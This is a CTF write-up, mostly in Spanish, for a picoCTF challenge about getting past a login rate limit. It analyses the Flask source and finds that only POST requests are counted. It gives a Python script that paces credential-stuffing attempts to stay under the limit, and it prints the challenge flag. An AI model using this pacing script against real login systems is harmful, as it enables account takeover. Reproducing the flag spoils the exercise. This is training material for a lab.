# Descripción
Your friend is building a simple website with a login page.To stop brute forcing and credential stuffing, they’ve added an IP-based rate limit: exceed the attempt threshold and your IP is blocked for a while. They’re convinced this makes guessing credentials impossible.To test their defense, they’ve:

- Created a dummy account with a random username–password pair from public credential lists.
- Given you those username and password lists.
- Shared the full source code.

Can you bypass the rate limit, log in, and capture the flag?

Browse the site [here](http://candy-mountain.picoctf.net:65225/).

App source code: [here](https://challenge-files.picoctf.net/c_candy_mountain/35131698b4de5b10a08dea341ecd7c56ed7c713ad14e0b8a6ff21e21f1c71a1e/app.py). 

Credentials dump [here](https://challenge-files.picoctf.net/c_candy_mountain/35131698b4de5b10a08dea341ecd7c56ed7c713ad14e0b8a6ff21e21f1c71a1e/creds-dump.txt).

# Solución
Descargamos los 2 archivos del codigo fuente y de las credenciales, al ingresar a la pagina web solo observamos un login, pero primero comenzamos analizando el codigo fuente, y observamos la vulnerabilidad:

En el código, la función `exceeded_rate_limit()` obtiene la IP así:

```python
client_ip = request.remote_addr
```

Usa **`request.remote_addr`** directamente — esto significa que **no** usa headers como `X-Forwarded-For`, así que ese bypass no funcionará aquí. Pero observamos:

```python
# log request if it was a POST
if request.method == "POST":
    request_rates[client_ip]['num_requests'] += 1
```

El contador **solo se incrementa en POST**. Y aquí está la clave:

```
if request_rates[client_ip]['num_requests'] > MAX_REQUESTS:  # > 10, no >= 10
    ...lockout...
    return True
```

Entonces tenemos  **10 intentos** antes del bloqueo (MAX_REQUESTS = 10), con una ventana de **30 segundos** (EPOCH_DURATION). Después del bloqueo, dura **120 segundos**. Hacemos  **10 intentos cada 30 segundos** esperando que el epoch se resetee (utilizando las credenciales):

```python
import requests
import time

url = "http://candy-mountain.picoctf.net:65225/login"

with open("creds-dump.txt") as f:
    creds = [line.strip().split(";") for line in f if ";" in line]

attempts = 0
for user, passwd in creds:
    # Esperar antes de llegar al límite
    if attempts > 0 and attempts % 9 == 0:
        print(f"[!] Esperando 31 segundos para resetear epoch...")
        time.sleep(31)

    r = requests.post(url, data={"username": user, "password": passwd})
    attempts += 1
    print(f"[{attempts}] {user}:{passwd} -> {r.status_code}")

    if "flag" in r.text.lower() or "welcome" in r.text.lower():
        print(f"\n[FLAG ENCONTRADA] Usuario: {user} | Pass: {passwd}")
        print(r.text)
        break
    
    if "Rate" in r.text:
        print("Bloqueado, esperando 121 segundos...")
        time.sleep(121)
        attempts = 0
```

Esperamos al rededor de 11 rondas y encontramos la flag:

picoCTF{f00l_7h4t_l1m1t3r_9a1c0ffb}
# Notas adicionales
- 
# Referencias
- 